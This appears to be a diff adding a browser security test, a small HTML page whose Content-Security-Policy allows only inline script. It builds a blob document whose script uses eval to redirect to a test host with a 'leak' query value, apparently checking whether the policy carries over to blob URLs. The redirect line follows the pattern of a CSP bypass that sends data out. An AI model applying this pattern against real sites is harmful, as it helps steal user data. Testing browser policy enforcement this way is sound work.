@@ -1,0 +1,16 @@
+<head>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'"></meta>
+</head>
+
+<body>
+    <script>
+        let blobContent = `
+            <script>
+                eval('document.location.href="https://a.test/report/?leak=c990581"');
+            <\/script>
+        `;
+        let blob = new Blob([blobContent], { type: 'text/html' });
+        let url = URL.createObjectURL(blob);
+        location.href = url;
+    </script>
+</body>
